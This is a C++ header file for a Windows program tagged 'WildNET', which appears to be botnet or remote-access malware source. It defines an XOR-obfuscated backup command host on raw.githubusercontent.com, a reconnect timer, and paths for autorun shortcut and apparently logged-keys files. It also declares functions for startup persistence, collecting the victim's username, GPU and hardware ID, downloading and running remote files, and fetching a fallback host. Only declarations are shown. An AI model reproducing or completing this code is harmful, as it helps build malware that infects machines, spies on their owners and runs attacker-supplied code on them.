#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <shlobj.h>
#include <time.h>
#include "XOR.h"

#ifdef _DEBUG
	#include <iostream>
	#define print(var) cout << "[WildNET] > " << var << std::endl;
#endif

#define STRLEN(x) (sizeof(x) / sizeof(TCHAR) - 1)
#define PORT 1234
#define TTR 30 * 60
#define DEFAULT_BUFLEN 1024 

#define BACKUPHOST TEXT(XorStr("raw.githubusercontent.com"))
#define BACKUPPATH TEXT(XorStr("raw path with backup address"))
#define VERSION XorStr("1.2")

extern TCHAR szMainFile[MAX_PATH + 1];
extern TCHAR szPingFile[MAX_PATH + 1];
extern TCHAR szLnkFile[MAX_PATH + 1];
extern TCHAR szAppdata[MAX_PATH + 1];
extern TCHAR szKeys[MAX_PATH + 1];

using namespace std;

void RandomString(char* s, const int len);
void AutoRun();
void _GetUserName(char* returnval);
void _GetGPU(char* returnval);
void _GetHwid(char* returnval);
void DownloadAndStart(char* URL);
void DeleteOldFiles();
void GetBackUpHost(char* szNewHost);